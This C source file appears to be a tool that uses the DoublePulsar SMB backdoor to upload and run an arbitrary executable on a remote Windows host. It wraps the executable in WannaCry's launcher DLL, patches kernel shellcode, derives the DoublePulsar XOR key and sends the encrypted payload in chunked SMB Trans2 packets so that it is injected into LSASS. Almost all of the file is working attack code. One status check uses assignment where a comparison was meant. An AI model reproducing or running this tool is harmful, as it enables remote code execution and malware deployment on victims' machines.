#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <Windows.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>
#include "Doublepulsar_launcher_dll.h"
#include "rundll_shellcode.h"
#pragma comment(lib, "ws2_32.lib")
/*
The program reads in a sample EXE, such as Putty.exe, and merges it with the Wannacry launcher.dll found in the worm.
This DLL serves as a skeleton that allows attaching an executable at the end. When loaded, the DLL extracts the EXE resource,
writes it to disk, and runs it.

Next, the program merges the Shellcode with the DLL and executable. It patches the required values for the process to work:

// The size of the DLL + Userland shellcode needed for the kernel shellcode to determine how much to copy into the victim process (LSASS).

Example: Total DLL size (including your EXE) = 0x50D800 bytes in size.

Update that value in the kernel shellcode, which also includes 3978 bytes of userland shellcode.
This instructs the kernel shellcode to tell the OS how much memory to allocate for the DLL and the Userland DLL bootstrap shellcode.
Kernel Shellcode[2158] = 0x50D800 + 3978;

USERLAND SHELLCODE HERE:
Update the size of the DLL here:
Kernel Shellcode[2166+0xF82] = 0x50D800; // DLL length
Kernel Shellcode[2166+0xF86] = 1; // DLL ordinal

Important values to know:
Kernel Shellcode total: 0x1800
Kernel portion of the shellcode (kernel): 2166
Userland Shellcode size: 3978
Kernel Shellcode (2166) + Userland Shellcode (3978) = 0x1800 = 6144

Size of Wannacry's launcher DLL: 0xc8a4

BEFORE the XOR encryption, you must include the EXE length after the DLL, which comes after the kernel shellcode and at the end of the DLL length (0xc8a4).
The payload buffer is then XOR encrypted with the DoublePulsar key and ready to ship.
*/

// SmbNegociate represents the SMB negotiation packet used in the DoublePulsar-based exe uploader.
// It is responsible for initiating the SMB session negotiation.
unsigned char SmbNegociate[] = {
	"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54\x20\x4c"
	"\x4d\x20\x30\x2e\x31\x32\x00"
};

// Session_Setup_AndX_Request contains the SMB Session Setup AndX Request packet for DoublePulsar.
// It establishes the session with the target system.
unsigned char Session_Setup_AndX_Request[] = {
	"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff\xff\x02"
	"\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0b\x00\x00"
	"\x00\x6e\x74\x00\x70\x79\x73\x6d\x62\x00"
};

// SMB_TreeConnectAndX holds the Tree Connect AndX packet for the DoublePulsar-based exe uploader.
// This packet is used to connect to a share on the target system.
unsigned char SMB_TreeConnectAndX[] = {
	"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01"
	"\x00\x2F\x00\x00"
};

// SMB_TreeConnectAndX_ is an auxiliary array used in the Tree Connect AndX packet construction.
unsigned char SMB_TreeConnectAndX_[] = {
	"\x00\x00\x3F\x3F\x3F\x3F\x3F\x00"
};

//Fixed Trans2 session setup PING packet. This should work
// trans2_request represents the Trans2 Session Setup PING packet used in the DoublePulsar-based exe uploader.
// This packet is used to set up a transaction 2 subcommand session with the target system.
unsigned char trans2_request[] = {
	"\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00"
	"\x00\x00\x00\x00\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01\x00\x0E"
	"\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
};

//Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
// wannacry_Trans2_Request contains the Trans2 session setup EXEC request used in the Wannacry worm.
// It allows execution of a shellcode within the target system's LSASS process.
unsigned char wannacry_Trans2_Request[] = {
	"\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00"
	"\x00\x00\x00\x00\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01\x00\x0e"
	"\x00\x0d\x10\x00"
};

// Function to convert Little-Endian data to an unsigned integer
unsigned int LE2INT(unsigned char *data) {
	unsigned int b;
	b = data[3];
	b <<= 8;
	b += data[2];
	b <<= 8;
	b += data[1];
	b <<= 8;
	b += data[0];
	return b;
}

// Function to compute the XOR key for DoublePulsar
// Input: sig - The input signature for XOR computation
// Output: The computed XOR key
unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig) {
	// First we perform left shift operations to get the individual parts of the signature
	unsigned int part1 = (sig >> 16) | (sig & 0xFF0000); // Bits 16-23 and 0-15 combined
	unsigned int part2 = (sig << 16) | (sig & 0xFF00);   // Bits 0-7 and 16-23 combined
	// Then we combine the shifted parts and perform XOR operations
	unsigned int xorKey = 2 * sig ^ ((part1 >> 8) | (part2 << 8));

	// Finally we return the computed xor key
	return xorKey;
}
// Function to convert and overwrite a name in a specific format
void convert_name(char *out, char *name) {
	unsigned long len = strlen(name);
	out += (len * 2) - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}
// Function to print the hexadecimal dump of a memory block
void hexDump(char *desc, void *addr, int len) {
	int i;
	unsigned char buff[17];
	unsigned char *pc = (unsigned char *)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
			buff[i % 16] = '.';
		} else {
			buff[i % 16] = pc[i];
		}

		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}

unsigned char recvbuff[2048];

int main(int argc, char *argv[]) {
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET    sock;
	DWORD    ret;
	WORD    userid, treeid, processid, multiplexid;

	WSAStartup(MAKEWORD(2, 2), &ws);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0) {
		return 0;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons((USHORT)445);
	ret = connect(sock, (struct sockaddr *)&server, sizeof(server));

	//send SMB negociate packet
	send(sock, (char *)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(sock, (char *)recvbuff, sizeof(recvbuff), 0);

	//send Session Setup AndX request
	printf("sending Session_Setup_AndX_Request!\n");
	ret = send(sock, (char *)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(sock, (char *)recvbuff, sizeof(recvbuff), 0);

	//copy our returned userID value from the previous packet to the TreeConnect request packet
	userid = *(WORD *)(recvbuff + 0x20);

	//Generates a new TreeConnect request with the correct IP address
	//rather than the hard coded one embedded in the TreeConnect string
	unsigned char packet[4096];
	unsigned char *ptr;
	unsigned char tmp[1024];
	unsigned short smblen;
	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
	ptr += sizeof(SMB_TreeConnectAndX) - 1;
	sprintf((char *)tmp, "\\\\%s\\IPC$", argv[1]);
	convert_name((char *)ptr, (char *)tmp);
	smblen = strlen((char *)tmp) * 2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX) - 1 - 3, &smblen, 1);
	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_) - 1);
	ptr += sizeof(SMB_TreeConnectAndX_) - 1;
	smblen = ptr - packet;
	smblen -= 4;
	memcpy(packet + 3, &smblen, 1);

	//update UserID in modified TreeConnect Request
	memcpy(packet + 0x20, (char *)&userid, 2); //update userid in packet

	//send modified TreeConnect request
	send(sock, (char *)packet, ptr - packet, 0);
	recv(sock, (char *)recvbuff, sizeof(recvbuff), 0);

	//copy the treeID from the TreeConnect response
	treeid = *(WORD *)(recvbuff + 0x1c);       //get treeid

	//Update treeID, UserID
	memcpy(trans2_request + 28, (char *)&treeid, 2);
	memcpy(trans2_request + 32, (char *)&userid, 2);
	//might need to update processid

	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
	//will return x51 or 81
	send(sock, (char *)trans2_request, sizeof(trans2_request) - 1, 0);
	recv(sock, (char *)recvbuff, sizeof(recvbuff), 0);

	unsigned char signature[6];
	unsigned int sig;
	//copy SMB signature from recvbuff to local buffer
	signature[0] = recvbuff[18];
	signature[1] = recvbuff[19];
	signature[2] = recvbuff[20];
	signature[3] = recvbuff[21];
	signature[4] = recvbuff[22];
	signature[5] = '\0';
	//this is for determining architecture
	//recvbuff[22];
	//but unused at this time

	//convert the signature buffer to unsigned integer
	//memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
	sig = LE2INT(signature);

	//calculate the XOR key for DoublePulsar
	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
	printf("Calculated XOR KEY:  0x%x\n", XorKey);

	//your file path here
	char filename[MAX_PATH] = "D:\\strike\\putty.exe";
	printf("Loading file: %s\n", filename);
	DWORD	dwFileSizeLow = NULL;
	DWORD	dwFileSizeHigh = NULL;
	DWORD	dwOffset = NULL;
	DWORD	dwDummy = -1;
	HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

	dwFileSizeLow = GetFileSize(hFile, &dwFileSizeHigh);
	printf("> File Size: %d bytes\n", dwFileSizeLow);

	PBYTE pExeBuffer = new BYTE[dwFileSizeLow];

	while (dwDummy) {
		ReadFile(hFile, pExeBuffer + dwOffset, 512, &dwDummy, NULL);
		dwOffset += dwDummy;
		//printf("> Read %d bytes - Offset = %d\n", dwDummy, dwOffset);
	}

	CloseHandle(hFile);

	//0x50D800 = 5298176
	DWORD DLLSIZE = 0x50D000;

	//allocate memory for DLL creation
	PBYTE DLL = new BYTE[DLLSIZE];
	memset(DLL, 0x00, DLLSIZE);

	//copy launcher DLL to buffer
	memcpy(DLL, launcher_dll, 0xc8a4);
	hexDump(NULL, (char *)&DLL[0xc8a4], 4);

	//add the size of the EXE after the DLL
	*(DWORD *)&DLL[0xc8a4] = dwFileSizeLow;
	hexDump(NULL, (char *)&DLL[0xc8a4], 4);

	//copy the EXE to the buffer, after the DWORD size value
	memcpy(DLL + 0xc8a4 + 4, pExeBuffer, dwFileSizeLow);
	printf("MZ HEADER EXPECTED:  ");
	hexDump(NULL, (char *)&DLL[0xc8a4 + 4], 4);

	//write out file here for debug purposes
	/*
	HANDLE hWriteFile;
	DWORD WriteNumberOfBytesToWrite = 0;
	char szDest[MAX_PATH] = "D:\\STRIKE\\file.dll";
	hWriteFile = CreateFileA(szDest, 0x40000000, 2, 0, 2, 4, 0);
	WriteFile(hWriteFile, (PBYTE*)DLL, DLLSIZE, &WriteNumberOfBytesToWrite, NULL);
	CloseHandle(hWriteFile);
	*/

	DWORD size = DLLSIZE;
	int difference = size - 4 - dwFileSizeLow;
	printf("DLL size = %d\n", size);
	printf("Exe file size:  %d\n", dwFileSizeLow);
	printf("Difference in bytes:  %d\n", difference);

	printf("patching DLL + Userland shellcode size in Kernel shellcode...\n");
	printf("BEFORE:  ");
	hexDump(NULL, (char *)&kernel_rundll_shellcode[2158], 4);

	DWORD value = 5298176 + 3978;
	*(DWORD *)&kernel_rundll_shellcode[2158] = value; // 5298176 + 3978;
	printf("AFTER:  ");
	hexDump(NULL, (char *)&kernel_rundll_shellcode[2158], 4);

	printf("patching DLL size...\n");
	printf("BEFORE:  ");
	hexDump(NULL, (char *)&kernel_rundll_shellcode[2166 + 0xF82], 4);
	*(DWORD *)&kernel_rundll_shellcode[2166 + 0xF82] = DLLSIZE;
	printf("AFTER:  ");
	hexDump(NULL, (char *)&kernel_rundll_shellcode[2166 + 0xF82], 4);
	printf("patching DLL ordinal...\n");
	printf("BEFORE:  ");
	hexDump(NULL, (char *)&kernel_rundll_shellcode[2166 + 0xF86], 1);
	*(DWORD *)&kernel_rundll_shellcode[2166 + 0xF86] = 1;
	printf("AFTER:  ");
	hexDump(NULL, (char *)&kernel_rundll_shellcode[2166 + 0xF86], 1);

	int kernel_shellcode_size = sizeof(kernel_rundll_shellcode) / sizeof(kernel_rundll_shellcode[0]);
	kernel_shellcode_size -= 1;
	printf("Kernel shellcode size:  %d\n", kernel_shellcode_size);

	int payload_totalsize = kernel_shellcode_size + DLLSIZE;
	PBYTE pFULLBUFFER = new BYTE[payload_totalsize];
	memset(pFULLBUFFER, 0x00, payload_totalsize);

	int numberofpackets = payload_totalsize / 4096;
	int iterations = payload_totalsize % 4096;
	printf("will send %d packets\n ", numberofpackets);
	printf("%d as a remainder\n", iterations);

	memcpy(pFULLBUFFER, kernel_rundll_shellcode, 6144);
	memcpy(pFULLBUFFER + 6144, DLL, DLLSIZE);

	//unsigned int XorKey = 0x58581162;
	unsigned char byte_xor_key[5];
	byte_xor_key[0] = (unsigned char)XorKey;
	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
	int i;

	for (i = 0; i < payload_totalsize; i++) {
		pFULLBUFFER[i] ^= byte_xor_key[i % 4];
	}

	unsigned char Parametersbuffer[13];
	unsigned int bytesLeft = payload_totalsize;

	//for doublepulsar parameters
	unsigned int TotalSizeOfPayload = payload_totalsize;
	unsigned int ChunkSize = 4096;
	unsigned int OffsetofChunkinPayload = 0x0000;
	int ctx;

	//unsigned short smblen;
	unsigned short smb_htons_len;

	unsigned short TotalDataCount = 4096;
	unsigned short DataCount = 4096;
	unsigned short byteCount = 4096 + 13;

	//unsigned char SMBDATA[4096];
	//memset(SMBDATA, 0x00, 4096);
	unsigned char *big_packet = (unsigned char *)malloc(4096 + 12 + 70);
	int size_normal_packet = 4096 + 12 + 70;

	unsigned char *last_packet = (unsigned char *)malloc(iterations + 12 + 70);
	int size_last_packet = iterations + 12 + 70;

	for (ctx = 0; ctx < payload_totalsize;) {
		memset((unsigned char *)big_packet, 0x00, 4096 + 12 + 70);
		if (bytesLeft < 4096) {
			printf("Bytes left(%d) is less than 4096!...This will be the last & smaller packet!\n", bytesLeft);
			smblen = bytesLeft + 70 + 12 - 4;
			printf("Last packet size = %d\n", smblen);
			smb_htons_len = htons(smblen);

			memset(Parametersbuffer, 0x00, 12);
			memcpy((unsigned char *)Parametersbuffer, (unsigned char *)&TotalSizeOfPayload, 4);
			memcpy((unsigned char *)Parametersbuffer + 4, (unsigned char *)&bytesLeft, 4);
			memcpy((unsigned char *)Parametersbuffer + 8, (unsigned char *)&OffsetofChunkinPayload, 4);

			for (i = 0; i < 13; i++) {
				Parametersbuffer[i] ^= byte_xor_key[i % 4];
			}

			//hexDump(NULL, Parametersbuffer, 12);

			//copy wannacry skeleton packet to big Trans2 packet
			memcpy((unsigned char *)last_packet, (unsigned char *)wannacry_Trans2_Request, 70);

			//update size
			memcpy(last_packet + 2, &smb_htons_len, 2);
			printf("Last packet SMB len -> ");
			hexDump(NULL, (char *)last_packet, 4);

			TotalDataCount = bytesLeft;
			DataCount = bytesLeft;
			byteCount = bytesLeft + 13;

			*(WORD *)(last_packet + 0x27) = TotalDataCount;
			*(WORD *)(last_packet + 0x3b) = DataCount;
			*(WORD *)(last_packet + 0x43) = byteCount;

			memcpy((unsigned char *)last_packet + 0x27, (char *)&TotalDataCount, 2);
			memcpy((unsigned char *)last_packet + 0x3b, (char *)&DataCount, 2);
			memcpy((unsigned char *)last_packet + 0x43, (char *)&byteCount, 2);

			//Update treeID, UserID
			memcpy((unsigned char *)last_packet + 28, (char *)&treeid, 2);
			memcpy((unsigned char *)last_packet + 32, (char *)&userid, 2);

			//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
			memcpy((unsigned char *)last_packet + 70, (unsigned char *)Parametersbuffer, 12);

			//copy encrypted payload
			memcpy((unsigned char *)last_packet + 82, (unsigned char *)pFULLBUFFER + ctx, bytesLeft);

			//send the payload
			send(sock, (char *)last_packet, size_last_packet, 0);
			recv(sock, (char *)recvbuff, sizeof(recvbuff), 0);

			//DoublePulsar response: STATUS_NOT_IMPLEMENTED
			if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0) {
				printf("All data sent and got good response from DoublePulsar!\n");
			}

			if (recvbuff[34] = 0x52) {
				printf("Doublepulsar returned 82!\n");
			} else {
				printf("Doublepulsar didn't work!\n");
			}

			break;
		}

		memset(Parametersbuffer, 0x00, 12);
		memcpy((unsigned char *)Parametersbuffer, (unsigned char *)&TotalSizeOfPayload, 4);
		memcpy((unsigned char *)Parametersbuffer + 4, (unsigned char *)&ChunkSize, 4);
		memcpy((unsigned char *)Parametersbuffer + 8, (unsigned char *)&OffsetofChunkinPayload, 4);

		for (i = 0; i < 13; i++) {
			Parametersbuffer[i] ^= byte_xor_key[i % 4];
		}

		//hexDump(NULL, Parametersbuffer, 12);

		//copy wannacry skeleton packet to big Trans2 packet
		memcpy((unsigned char *)big_packet, (unsigned char *)wannacry_Trans2_Request, 70);

		//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
		memcpy((unsigned char *)big_packet + 70, (unsigned char *)Parametersbuffer, 12);

		//copy encrypted payload
		memcpy((unsigned char *)big_packet + 82, (unsigned char *)pFULLBUFFER + ctx, ChunkSize);

		//Update treeID, UserID
		memcpy((unsigned char *)big_packet + 28, (char *)&treeid, 2);
		memcpy((unsigned char *)big_packet + 32, (char *)&userid, 2);

		//send the payload
		send(sock, (char *)big_packet, size_normal_packet, 0);
		recv(sock, (char *)recvbuff, sizeof(recvbuff), 0);

		//DoublePulsar response: STATUS_NOT_IMPLEMENTED
		if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0) {
			printf("All data sent and got good response from DoublePulsar!\n");
		}

		if (recvbuff[34] = 0x52) {
			printf("Doublepulsar returned 82!\n");
		} else {
			printf("Doublepulsar didn't work!\n");
		}

		bytesLeft -= 4096;
		ctx += 4096;
		OffsetofChunkinPayload += 4096;
	}

	delete pExeBuffer;
	delete pFULLBUFFER;
	delete DLL;
	free(big_packet);
	free(last_packet);

	printf("Disconnecting!\n");

	unsigned char disconnect_packet[] =
		"\x00\x00\x00\x23\xff\x53\x4d\x42"
		"\x71\x00\x00\x00\x00\x18\x07\xc0"
		"\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x08\xff\xfe"
		"\x00\x08\x41\x00\x00\x00\x00";

	//Update treeID, UserID
	memcpy((unsigned char *)disconnect_packet + 28, (char *)&treeid, 2);
	memcpy((unsigned char *)disconnect_packet + 32, (char *)&userid, 2);

	//send the disconnect packet
	send(sock, (char *)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
	recv(sock, (char *)recvbuff, sizeof(recvbuff), 0);

	unsigned char logoff_packet[] =
		"\x00\x00\x00\x27\xff\x53\x4d\x42\x74\x00\x00"
		"\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff"
		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";

	//Update treeID, UserID
	memcpy((unsigned char *)logoff_packet + 28, (char *)&treeid, 2);
	memcpy((unsigned char *)logoff_packet + 32, (char *)&userid, 2);

	//send the logoff packet
	send(sock, (char *)logoff_packet, sizeof(logoff_packet) - 1, 0);
	recv(sock, (char *)recvbuff, sizeof(recvbuff), 0);

	closesocket(sock);
	WSACleanup();

	return 0;
}
